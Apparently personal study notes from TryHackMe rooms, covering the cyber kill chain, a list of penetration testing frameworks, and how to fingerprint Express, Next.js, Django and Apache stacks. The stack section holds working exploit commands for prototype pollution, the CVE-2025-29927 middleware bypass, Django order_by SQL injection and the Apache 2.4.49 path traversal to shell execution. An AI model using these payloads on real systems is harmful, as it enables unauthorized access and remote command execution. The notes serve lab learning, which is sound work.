# Cyber Kill Chain
[LINK](https://tryhackme.com/room/cyberkillchain)


1. Reconnaissance: In the first stage, the attacker gathers information about the target
2. Weaponisation: Once proper reconnaissance is conducted, the attacker creates a deliverable payload or modifies an existing one based on the target system’s vulnerabilities
3. Delivery: Once ready, the attacker sends the weaponised payload to the target
4. Exploitation: Once executed, the payload exploits a vulnerability in the target’s system
5. Installation: The exploitation enables the attacker to install a backdoor or malware to maintain in the target’s environment
6. Command & Control (): Using the installed backdoor, the attacker can control the compromised system
7. Actions on Objectives: Reaching this far, the attacker can now carry out further actions such as data exfiltration or other systems’ exploitation


# Penetration Testing Frameworks
[LINK](https://tryhackme.com/room/penetrationtestingframeworks)

###  OSSTMM 
Open Source Security Testing Methodology Manual

### OWASP WSTG
Open Web Application Security Project - Web Security Testing Guide (WSTG)

### NIST SP 800-115
National Institute of Standards and Technology 

### PTES
Penetration Testing Execution Standard

### ISSAF
Information Systems Security Assessment Framework

### MITRE ATT&CK

### WASC Threat Classification
Web Application Security Consortium

### CSA Cloud Controls Matrix(CCM)
Cloud Security Alliance (CSA) 

### MASTG
OWASP Mobile Application Security Testing Guide

### PCI DSS Penetration Testing Guidelines
Payment Card Industry Data Security Standard

### CBEST Framework


# Content Discovery
[LINK](https://tryhackme.com/room/contentdiscoveryx)

**Virtual Hosts Discovery with gobuster**


# Modern Web Stacks
[LINK](https://tryhackme.com/room/modernwebstacks)


### MERN Stack

- **`X-Powered-By: Express`** header (main signal)
- **`connect.sid`** cookie (express-session)
- **Plain text error:** `Cannot GET /nonexistent`

#### The Vulnerability: Prototype Pollution
- Unsafe recursive `merge` function that doesn’t filter `__proto__` or `constructor.prototype`.
- Payload: `{"__proto__": {"isAdmin": true}}`

#### Exploitation Steps
1. **Save session cookie** → `curl -c cookies.txt http://target:3000/`
2. **Pollute prototype** →  
   `curl -b cookies.txt -X POST http://target:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'`
3. **Access protected admin endpoint** →  
   `curl -b cookies.txt http://target:3000/api/admin/flag`


## Next.js

- **`X-Powered-By: Next.js`** header  
- **HTML source contains `window.__next_f`** (definitive App Router indicator)  
- Static asset paths: `/_next/static/chunks/`  
- `x-nextjs-cache` and `x-nextjs-prerender` headers

> **Note:** Development mode (`next dev`) is **not** vulnerable. Production build (`npm run build && npm start`) is required.


#### CVE-2025-29927 – Middleware Authentication Bypass (CVSS 9.1 Critical)

**What it is:**  
Next.js uses an internal header `x-middleware-subrequest` to prevent infinite loops when middleware calls itself. The framework never validated if the header came from an internal process or an external client.

**Attack:**  
Send the header with your request to skip middleware entirely (bypass authentication, session checks, etc.).

**Payload format:**  
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://target/dashboard
```
- For root-level `middleware.ts` → `middleware` repeated 5 times
- For `src/middleware.ts` → `src/middleware` repeated 5 times

**Result:** Access protected routes (e.g., `/dashboard`) without login.


### Django

- **`Server: WSGIServer/0.2 CPython/...`** header  
- **`csrftoken`** cookie  
- **`X-Frame-Options: DENY`** + **`X-Content-Type-Options: nosniff`** together  
- **`csrfmiddlewaretoken`** hidden field in POST forms (most reliable)  
- Admin panel at `/admin/` (enabled by default)


#### CVE-2021-35042 – SQL Injection in `order_by()` (CVSS 9.8 Critical)

**What it is:**  
Django’s `order_by()` method concatenates user input directly into an `ORDER BY` clause when developers bypass the ORM and write raw SQL.

**Vulnerable pattern (example from text):**
```python
order = request.GET.get('order', 'name')
sql = f'... ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
```

**Attack vector:**  
Parameter `?order=` in the URL.

**Exploitation technique (MySQL with `DEBUG = True`):**  
Use `updatexml()` to leak data via error messages.

**Payloads:**
1. Get MySQL version:  
   `?order=updatexml(1,concat(0x7e,(select @@version)),1)`
2. Get database name:  
   `?order=updatexml(1,concat(0x7e,(select database())),1)`




### LAMP Stack – Short Note

- **`Server: Apache/2.4.49 (Unix)`** header  
- **404 error page footer** also shows version  
- **`/cgi-bin/`** returns **403 Forbidden** (not 404) → confirms `mod_cgi` is enabled

> Exact version 2.4.49 is vulnerable to CVE-2021-41773. 2.4.50 has a partial patch (bypassable via double encoding – CVE-2021-42013). 2.4.51+ patched.


#### CVE-2021-41773 – Path Traversal to RCE

**What it is:**  
Apache 2.4.49 flawed path normalization: `.%2e/` bypasses the `../` filter. When combined with `mod_cgi` on `/cgi-bin/`, you can execute arbitrary system commands.

**Why `--path-as-is` is required:**  
`curl` normalizes URLs by default (removes `.%2e/`). The flag forces curl to send the exact encoded path.

**Exploitation payload:**
```bash
curl -s --path-as-is "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; <command>'
```

**Breakdown:**
- `/.%2e/.%2e/.%2e/.%2e/` = traverse up 4 directories to filesystem root
- `/bin/sh` = execute shell
- POST body must include `echo Content-Type: text/plain; echo;` (CGI header requirement)

